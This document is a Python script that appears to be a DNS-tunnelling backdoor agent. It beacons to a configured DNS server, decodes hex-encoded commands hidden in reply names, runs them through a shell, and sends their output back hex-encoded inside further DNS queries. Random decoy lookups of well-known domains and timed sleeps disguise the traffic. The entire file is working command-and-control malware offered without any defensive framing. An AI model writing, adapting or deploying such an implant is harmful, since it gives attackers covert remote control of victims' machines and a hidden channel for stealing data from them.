from dnslib import DNSRecord
import base64, time, socket, subprocess, random

bind_port = 53
bind_address = "127.0.0.1"
remote_address = "127.0.0.1"
remote_port = 53
nop = "google.com"
sleep_time = 10

domains = [
        "google.com",
        "youtube.com",
        "stackoverflow.com",
        "microsoft.com",
        "facebook.com",
        "amazon.com",
        "oracle.com",
        "bing.com",
        "slack.com",
        "duckduckgo.com"
    ]

subdomains = ["docs.", "admin.", "dev.", "faq.", "www.", "help.", "cloud.", "my."]

def send_question(domain):
    q = DNSRecord.question(domain)

    for i in range(3):
        try:
            return DNSRecord.parse(q.send(remote_address, port = remote_port, timeout = 1))
        except socket.timeout:
            continue
    return None

def parse_response(dns_resp):
    if dns_resp == None:
        return False

    rname = str(dns_resp.get_a().get_rname()).split('.')

    if rname[0] == 'success':
        print("Packet sucessfully received")
        return "update.google.com"

    if rname[0] == 'run':
        command = base64.b16decode(rname[1].upper()).decode('utf-8')
        result = subprocess.Popen(command.split(), shell = True, stdout = subprocess.PIPE, encoding = 'UTF-8')
           
        response = base64.b16encode(result.communicate()[0].encode('utf-8')).decode('utf-8').lower()
        return 'resp.' + response
    else:
        return "update." + domains[random.randint(0, len(domains) - 1)]

if __name__ == '__main__':
    answer = parse_response(send_question("init"))
    while True:
        answer = parse_response(send_question(answer))
        time.sleep(sleep_time)
        if random.random() < 0.3:
            send_question(subdomains[random.randint(0, len(subdomains) - 1)] + domains[random.randint(0, len(domains) - 1)])